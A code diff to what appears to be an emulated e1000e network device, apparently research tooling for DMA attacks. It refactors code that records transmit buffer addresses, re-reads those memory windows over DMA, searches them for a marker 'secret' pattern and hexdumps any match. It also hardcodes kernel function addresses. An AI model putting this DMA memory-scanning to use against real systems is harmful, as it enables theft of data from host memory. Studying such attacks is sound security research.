@@ -3762,22 +3762,62 @@ print_buffer_address_information(E1000ECore *core,
 	hexdump((uint8_t *)(&mbuf_buffer), 256);
 }
 
+struct window {
+	uint64_t base;
+	uint64_t length;
+};
+
+static inline void
+print_window(const struct window * const entry)
+{
+	printf("window 0x%lx (%ld bytes)", entry->base, entry->length);
+}
+
+void
+check_for_secret(struct window *window, uint8_t page[4096])
+{
+#define PATTERN_LENGTH 8
+	putchar('c');
+	fflush(stdout);
+
+	int64_t j;
+	uint64_t run_length = 1;
+	for (uint64_t i = 0; i < window->length; i += PATTERN_LENGTH) {
+		if (page[i] == 'i') {
+			j = i;
+			while (run_length < PATTERN_LENGTH && --j >= 0 && page[j] == 'i') {
+				++run_length;
+			}
+			j = i;
+			while (run_length < PATTERN_LENGTH && ++j < 4096 && page[j] == 'i') {
+				++run_length;
+			}
+			if (run_length == PATTERN_LENGTH) {
+				break;
+			}
+		}
+	}
+	if (run_length == PATTERN_LENGTH) {
+		fputs("Found pattern in page: ", stdout);
+		print_window(window);
+		putchar('\n');
+		hexdump(page, 4096);
+	}
+#undef PATTERN_LENGTH
+}
+
+/*#ifdef USE_WINDOW_LIST*/
+#if 1
 int window_list_length, window_list_min_length, window_list_max_length;
 
 SLIST_HEAD(window_list_head, window_list_entry) window_list_head
 	= SLIST_HEAD_INITIALIZER(window_list_head);
 
+
 struct window_list_entry {
-	uint64_t base;
-	uint64_t length;
+	struct window window;
 	SLIST_ENTRY(window_list_entry) window_list;
 };
-
-static inline void
-print_window(struct window_list_entry *entry)
-{
-	printf("window 0x%lx (%ld bytes)", entry->base, entry->length);
-}
 
 /* I don't like using the constructor attribute, but it's the simplest way to
  * go about this.
@@ -3807,46 +3847,16 @@ adjust_window_list_length(int diff)
 }
 
 bool
-window_in_list(uint64_t base, uint64_t length)
+window_in_list(struct window window)
 {
 	struct window_list_entry *window_list_entry;
 	SLIST_FOREACH(window_list_entry, &window_list_head, window_list) {
-		if (base == window_list_entry->base &&
-			length == window_list_entry->length) {
+		if (window.base == window_list_entry->window.base &&
+			window.length == window_list_entry->window.length) {
 			return true;
 		}
 	}
 	return false;
-}
-
-void
-check_for_secret(struct window_list_entry *window, uint8_t page[4096])
-{
-#define PATTERN_LENGTH 8
-	int64_t j;
-	uint64_t run_length = 1;
-	for (uint64_t i = 0; i < window->length; i += PATTERN_LENGTH) {
-		if (page[i] == 'i') {
-			j = i;
-			while (run_length < PATTERN_LENGTH && --j >= 0 && page[j] == 'i') {
-				++run_length;
-			}
-			j = i;
-			while (run_length < PATTERN_LENGTH && ++j < 4096 && page[j] == 'i') {
-				++run_length;
-			}
-			if (run_length == PATTERN_LENGTH) {
-				break;
-			}
-		}
-	}
-	if (run_length == PATTERN_LENGTH) {
-		fputs("Found pattern in page: ", stdout);
-		print_window(window);
-		putchar('\n');
-		hexdump(page, 4096);
-	}
-#undef PATTERN_LENGTH
 }
 
 void
@@ -3863,10 +3873,10 @@ check_windows_for_secret(E1000ECore *core)
 
 	while (check_head && entry != NULL) {
 		check_head = false;
-		read_result = perform_dma_long_read(page, entry->length,
-			core->owner->devfn, 8, entry->base);
-		if (read_result != DRR_SUCCESS) {
-			check_for_secret(entry, page);
+		read_result = perform_dma_long_read(page, entry->window.length,
+			core->owner->devfn, 8, entry->window.base);
+		if (read_result == DRR_SUCCESS) {
+			check_for_secret(&(entry->window), page);
 		} else {
 			/*fputs("Removing entry, as couldn't read ", stdout);*/
 			/*print_window(entry);*/
@@ -3880,10 +3890,10 @@ check_windows_for_secret(E1000ECore *core)
 	}
 
 	while ((entry != NULL) && (next = SLIST_NEXT(entry, window_list)) != NULL) {
-		read_result = perform_dma_long_read(page, entry->length,
-			core->owner->devfn, 8, next->base);
-		if (read_result != DRR_UNSUPPORTED_REQUEST) {
-			check_for_secret(next, page);
+		read_result = perform_dma_long_read(page, next->window.length,
+			core->owner->devfn, 8, next->window.base);
+		if (read_result == DRR_SUCCESS) {
+			check_for_secret(&(next->window), page);
 			entry = next;
 		} else {
 			/*fputs("Removing entry, as couldn't read ", stdout);*/
@@ -3907,15 +3917,15 @@ record_tx_windows_from_descriptor_address(E1000ECore *core,
 	struct e1000_tx_desc desc;
 	pci_dma_read(core->owner, descriptor_addr, &desc, sizeof(desc));
 
-	hwaddr base = le64_to_cpu(desc.buffer_addr);
-	hwaddr length = le16_to_cpu(desc.lower.flags.length);
+	struct window window;
+	window.base = le64_to_cpu(desc.buffer_addr);
+	window.length = le16_to_cpu(desc.lower.flags.length);
 
-	if (!window_in_list(base, length)) {
+	if (!window_in_list(window)) {
 		/*putchar('a');*/
 		/*fflush(stdout);*/
 		entry = malloc(sizeof(struct window_list_entry));
-		entry->base = base;
-		entry->length = length;
+		entry->window = window;
 		SLIST_INSERT_HEAD(&window_list_head, entry, window_list);
 		adjust_window_list_length(1);
 		/*fputs("Adding ", stdout);*/
@@ -3925,6 +3935,41 @@ record_tx_windows_from_descriptor_address(E1000ECore *core,
 
 	check_windows_for_secret(core);
 }
+#endif
+
+#if 0
+struct window the_window;
+bool the_window_in_use = false;
+
+void
+check_windows_for_secret(E1000ECore *core)
+{
+	uint8_t page[4096];
+
+
+void
+record_tx_windows_from_descriptor_address(E1000ECore *core,
+	dma_addr_t descriptor_addr, void *opaque)
+{
+	struct e1000_tx_desc desc;
+	pci_dma_read(core->owner, descriptor_addr, &desc, sizeof(desc));
+
+	hwaddr base = le64_to_cpu(desc.buffer_addr);
+	hwaddr length = le16_to_cpu(desc.lower.flags.length);
+
+	if (the_window_in_use) {
+		putchar('f');
+		fflush(stdout);
+	}
+
+	the_window_in_use = true;
+	the_window.base = base;
+	the_window.length = length;
+
+	check_windows_for_secret(core);
+}
+#endif
+
 
 const void *KERNEL_PRINTF_ADDR = 	(void *)0xffffffff80a4da90ll;
 const void *KERNEL_PANIC_ADDR =		(void *)0xffffffff80a0b9a0ll;
